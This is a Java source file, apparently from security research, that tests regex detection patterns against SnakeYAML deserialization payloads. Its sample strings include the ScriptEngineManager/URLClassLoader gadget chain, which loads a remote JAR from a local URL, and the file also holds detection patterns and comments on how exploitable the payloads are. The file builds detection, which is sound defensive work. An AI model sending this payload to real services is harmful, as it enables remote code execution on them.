package com.threedr3am.bug.feature;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;
import org.yaml.snakeyaml.Yaml;

/**
 * @author threedr3am
 */
public class SnakeYAML {

  static Pattern pattern = Pattern.compile("!![\\w\\.$]+? [\\[{].*?[\\]}]");
  static Pattern weakPattern = Pattern.compile("!!javax\\.script\\.ScriptEngineManager \\[.+?\\]");

  public static void main(String[] args) {
    printAndMatch("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"]]] ]");
    printAndMatch("!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"]] ]]");
    printAndMatch("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[ !!java.net.URL [\"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"] ]]]");
    printAndMatch("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [ \"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"]]]]");
    printAndMatch("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [   \"threedr3am\"]");
    printAndMatch("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [\"threedr3am\"    ]");
    printAndMatch("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [   \"threedr3am\"    ]");
    printAndMatch("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [\"threedr3am\"]");

    //todo !!com.threedr3am.bug.feature.SnakeYAML$A {xx: threedr3am} 使用花括号的反序列化，构造顺序为：调用构造方法->反射设置public field，因此，基本没办法利用
    Yaml yaml = new Yaml();
    printAndMatch(yaml.dump(new SnakeYAML()));
    printAndMatch(yaml.dump(new A("threedr3am")));
    Map<String, String> map = new HashMap<>();
    map.put("aaa","1");
    map.put("bbb","2");
    printAndMatch(yaml.dump(map));
    Map<String, A> map2 = new HashMap<>();
    map2.put("aaa",new A("threedr3am"));
    map2.put("bbb",new A("threedr3am"));
    printAndMatch(yaml.dump(map2));

    yaml.load("!!com.threedr3am.bug.feature.SnakeYAML$A {xx: threedr3am}");

  }

  private static void printAndMatch(String payload) {
    System.out.println(payload);
    System.out.println(pattern.matcher(payload).find());
    System.out.println(weakPattern.matcher(payload).find());
    System.out.println("----------------------------------------------------------------------");
  }

  static class A {
    public String xx;

    public A() {
      System.out.println("call A()");
      System.out.println("xx=" + xx);
    }

    public A(String xx) {
      System.out.println("call A(String xx)");
      this.xx = xx;
    }

    public String getXx() {
      System.out.println("call A.getXx");
      return xx;
    }

    public void setXx(String xx) {
      System.out.println("call A.setXx");
      this.xx = xx;
    }
  }

}
